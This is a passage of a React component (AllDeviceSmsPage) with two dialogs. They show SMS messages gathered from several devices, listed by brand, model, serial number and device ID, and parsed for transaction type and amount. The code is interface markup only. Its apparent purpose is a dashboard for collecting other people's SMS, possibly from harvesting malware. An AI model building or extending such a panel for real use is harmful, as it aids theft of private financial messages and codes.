              maxWidth: '500px',
              width: '100%',
              maxHeight: '90vh',
              overflow: 'hidden',
              boxShadow: '0 30px 80px rgba(0,0,0,0.5)',
              border: '1px solid var(--border-color)',
              animation: 'scaleIn 0.3s ease'
            }}
            onClick={(e) => e.stopPropagation()}
          >
            <div style={{
              padding: '14px 18px',
              borderBottom: '1px solid var(--border-color)',
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'flex-start',
              background: 'var(--bg-input)'
            }}>
              <div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                  <span style={{
                    fontSize: '10px',
                    fontWeight: 700,
                    color: 'var(--text-muted)',
                    background: 'var(--bg-input)',
                    padding: '1px 8px',
                    borderRadius: '8px',
                    border: '1px solid var(--border-color)'
                  }}>
                    #{selectedMessage.serialNo || 'N/A'}
                  </span>
                  <h4 style={{ margin: 0, fontSize: '15px', fontWeight: 700, color: 'var(--text-primary)' }}>
                    📩 {selectedMessage.sender || 'Unknown'}
                  </h4>
                </div>
                <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
                  {selectedMessage.deviceId?.slice(0, 16)}...
                </span>
              </div>
              <button
                onClick={closeMessageDetail}
                style={{
                  background: 'none',
                  border: 'none',
                  fontSize: '22px',
                  color: 'var(--text-muted)',
                  cursor: 'pointer',
                  padding: '2px 6px',
                  borderRadius: '50%',
                  transition: 'all 0.2s'
                }}
                onMouseEnter={(e) => { e.target.style.background = 'rgba(231,76,60,0.1)'; e.target.style.color = '#e74c3c'; }}
                onMouseLeave={(e) => { e.target.style.background = 'none'; e.target.style.color = 'var(--text-muted)'; }}
              >
                ✕
              </button>
            </div>

            <div style={{ padding: '16px 18px', maxHeight: 'calc(90vh - 80px)', overflowY: 'auto' }}>
              <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap', marginBottom: '10px' }}>
                <span style={{ fontSize: '10px', fontWeight: 600, padding: '3px 10px', borderRadius: '10px', background: getTypeBadge(selectedMessage).bg, color: getTypeBadge(selectedMessage).color }}>
                  {getTypeBadge(selectedMessage).text}
                </span>
                <span style={{ fontSize: '10px', fontWeight: 600, padding: '3px 10px', borderRadius: '10px', background: getCategoryBadge(selectedMessage.category).bg, color: getCategoryBadge(selectedMessage.category).color }}>
                  {getCategoryBadge(selectedMessage.category).text}
                </span>
                {selectedMessage.amount && (
                  <span style={{ fontSize: '14px', fontWeight: 700, color: getTypeBadge(selectedMessage).color }}>
                    {formatAmount(selectedMessage.amount)}
                  </span>
                )}
                <button
                  onClick={(e) => { e.stopPropagation(); toggleFavorite(selectedMessage.id, e); }}
                  style={{
                    background: 'none',
                    border: 'none',
                    fontSize: '18px',
                    cursor: 'pointer',
                    color: favorites[selectedMessage.id] ? '#f1c40f' : 'var(--text-muted)'
                  }}
                >
                  {favorites[selectedMessage.id] ? '⭐' : '☆'}
                </button>
              </div>

              <div style={{
                background: 'var(--bg-input)',
                borderRadius: '10px',
                padding: '14px',
                fontSize: '13px',
                lineHeight: '1.6',
                color: 'var(--text-primary)',
                whiteSpace: 'pre-wrap',
                wordWrap: 'break-word',
                border: '1px solid var(--border-color)'
              }}>
                {selectedMessage.message || 'No message content'}
              </div>

              <div style={{ marginTop: '10px', fontSize: '10px', color: 'var(--text-muted)' }}>
                🕐 {formatTime(selectedMessage.time)} • {formatTimeAgo(selectedMessage.time)}
              </div>

              <button
                onClick={() => {
                  closeMessageDetail();
                  setTimeout(() => openDeviceDetail(selectedMessage.deviceId), 300);
                }}
                style={{
                  width: '100%',
                  padding: '10px',
                  marginTop: '14px',
                  border: 'none',
                  borderRadius: '10px',
                  background: 'linear-gradient(135deg, #6c63ff, #3b82f6)',
                  color: 'white',
                  fontSize: '13px',
                  fontWeight: 700,
                  cursor: 'pointer',
                  transition: 'all 0.3s'
                }}
                onMouseEnter={(e) => { e.target.style.transform = 'translateY(-2px)'; e.target.style.boxShadow = '0 4px 20px rgba(108,99,255,0.3)'; }}
                onMouseLeave={(e) => { e.target.style.transform = 'translateY(0)'; e.target.style.boxShadow = 'none'; }}
              >
                📱 View Device
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Device SMS Dialog */}
      {showSmsDialog && selectedDevice && (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            background: 'rgba(0,0,0,0.7)',
            backdropFilter: 'blur(12px)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 9999,
            padding: '16px',
            animation: 'fadeIn 0.3s ease'
          }}
          onClick={closeSmsDialog}
        >
          <div
            style={{
              background: 'var(--bg-card)',
              borderRadius: '14px',
              maxWidth: '460px',
              width: '100%',
              maxHeight: '92vh',
              overflow: 'hidden',
              boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
              border: '1px solid var(--border-color)',
              animation: 'scaleIn 0.3s ease',
              display: 'flex',
              flexDirection: 'column'
            }}
            onClick={(e) => e.stopPropagation()}
          >
            <div style={{
              padding: '12px 16px',
              borderBottom: '1px solid var(--border-color)',
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              background: 'var(--bg-input)',
              flexShrink: 0,
              flexWrap: 'wrap',
              gap: '6px'
            }}>
              <div>
                <h4 style={{ margin: 0, fontSize: '14px', fontWeight: 700, color: 'var(--text-primary)' }}>
                  📨 {selectedDevice.brand} {selectedDevice.model}
                </h4>
                <span style={{ fontSize: '9px', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
                  #{selectedDevice.serialNo} • {selectedDevice.deviceId?.slice(0, 16)}...
                </span>
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                <span style={{ fontSize: '10px', fontWeight: 600, color: '#6c63ff', background: 'rgba(108,99,255,0.1)', padding: '2px 8px', borderRadius: '10px' }}>
                  📨 {selectedDevice.smsCount}
                </span>
                <button onClick={closeSmsDialog} style={{ background: 'none', border: 'none', fontSize: '20px', color: 'var(--text-muted)', cursor: 'pointer', padding: '2px 6px', borderRadius: '50%' }}>
                  ✕
                </button>
              </div>
            </div>

            <div style={{ padding: '8px 16px', borderBottom: '1px solid var(--border-color)', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap', flexShrink: 0 }}>
              <span style={{ fontSize: '10px', fontWeight: 600, color: 'var(--text-muted)' }}>Filter:</span>
              <select value={filterSender} onChange={(e) => setFilterSender(e.target.value)} style={{ padding: '3px 8px', border: '1px solid var(--border-color)', borderRadius: '6px', background: 'var(--bg-input)', color: 'var(--text-primary)', fontSize: '11px', outline: 'none' }}>
                <option value="all">📨 All Senders</option>
                {getDeviceSenders().map(sender => <option key={sender} value={sender}>{sender}</option>)}
              </select>
              <span style={{ fontSize: '9px', color: 'var(--text-muted)' }}>{filteredSms.length} messages</span>
            </div>

            <div style={{ padding: '10px 16px 16px', overflowY: 'auto', flex: 1, maxHeight: 'calc(92vh - 160px)' }}>
              {filteredSms.length === 0 ? (
                <div style={{ textAlign: 'center', padding: '30px', color: 'var(--text-muted)' }}>
                  <span style={{ fontSize: '30px', display: 'block', marginBottom: '6px' }}>📭</span>
                  <p>No messages</p>
                </div>
              ) : (
                filteredSms.map((sms, index) => {
                  const typeInfo = getTypeBadge({ ...sms, type: detectTransactionType(sms.message) });
                  const amount = extractAmount(sms.message);
                  return (
                    <div key={index} style={{
                      padding: '8px 10px',
                      marginBottom: '6px',
                      background: 'var(--bg-input)',
                      borderRadius: '6px',
                      border: '1px solid var(--border-color)',
                      borderLeft: `3px solid ${typeInfo.color}`
                    }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '2px', flexWrap: 'wrap', gap: '2px' }}>
                        <span style={{ fontSize: '11px', fontWeight: 700, color: typeInfo.color }}>📩 {sms.sender || 'Unknown'}</span>
                        <span style={{ fontSize: '8px', color: 'var(--text-muted)' }}>{formatTime(sms.time)}</span>
                      </div>
                      {amount && <div style={{ fontSize: '11px', fontWeight: 700, color: typeInfo.color }}>{typeInfo.text} • {formatAmount(amount)}</div>}
                      <div style={{ fontSize: '11px', color: 'var(--text-primary)', wordWrap: 'break-word', whiteSpace: 'pre-wrap' }}>{sms.message || 'No message'}</div>
                    </div>
                  );
                })
              )}
            </div>

            <button onClick={() => { closeSmsDialog(); setTimeout(() => navigate(`/device/${selectedDevice.deviceId}`), 300); }} style={{
              margin: '6px 16px 16px',
              padding: '8px',
              border: 'none',
              borderRadius: '8px',
              background: 'linear-gradient(135deg, #6c63ff, #3b82f6)',
              color: 'white',
              fontSize: '12px',
              fontWeight: 700,
              cursor: 'pointer',
              flexShrink: 0
            }}>
              📱 View Device
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default AllDeviceSmsPage;